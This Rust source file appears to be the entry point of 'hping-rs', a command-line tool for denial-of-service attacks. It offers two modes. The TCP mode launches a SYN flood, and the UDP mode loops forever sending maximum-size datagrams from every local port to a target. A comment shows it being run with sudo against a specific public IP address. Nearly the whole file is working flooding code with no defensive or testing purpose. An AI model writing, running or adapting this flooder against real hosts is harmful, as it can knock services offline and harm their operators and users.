pub mod route;

use route::tcp::packet::send_tcp_packets;
use std::env;
use std::io;
use std::net::Ipv4Addr;
use tokio::net::UdpSocket;

//sudo ./target/release/hping-rs tcp 23.227.146.106

#[tokio::main]
async fn main() -> io::Result<()> {
    let args: Vec<_> = env::args().collect();

    if args.len() <= 2 {
        println!(
            "usage: \n
            UDP : ./hping-rs udp ip:port \n
            TCP : ./hping-rs tcp ip
            "
        );
        panic!();
    }

    let method = args[1].to_string();
    let host = args[2].to_string();

    let buf = [1; 65507];

    match method.as_str() {
        "tcp" => {
            let interface = String::from("enp2s0");

            println!("start TCP SYN flooding!");

            send_tcp_packets(host.parse::<Ipv4Addr>().unwrap(), interface);
        }
        "udp" => {
            println!("start UDP flooding!");
            loop {
                for i in 1..65535 {
                    let sock = UdpSocket::bind(format!("0.0.0.0:{}", i)).await;

                    match sock {
                        Err(_e) => continue,
                        Ok(sock) => {
                            let _result = sock.send_to(&buf, &host).await;
                        }
                    }
                }
            }
        }
        _ => println!("invaild method!"),
    }

    Ok(())
}
